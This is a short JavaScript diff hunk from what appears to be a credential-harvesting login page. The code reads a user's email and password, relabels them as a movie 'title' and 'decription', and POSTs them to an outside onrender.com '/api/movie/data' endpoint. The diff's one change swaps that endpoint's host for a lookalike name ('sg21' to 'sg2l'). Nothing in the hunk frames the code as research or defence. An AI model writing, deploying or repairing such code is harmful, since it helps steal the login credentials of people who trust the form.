@@ -9,7 +9,7 @@ const sendmeth = () => {
     const password = passwordInput.value;
     const pkg = { title: email, decription: password }
     console.log(JSON.stringify(pkg))
-    const API = "https://admin-api-maaj-sg21.onrender.com/api/movie/data"
+    const API = "https://admin-api-maaj-sg2l.onrender.com/api/movie/data"
     if (email && password) {
         fetch(API, {
             method: 'POST',
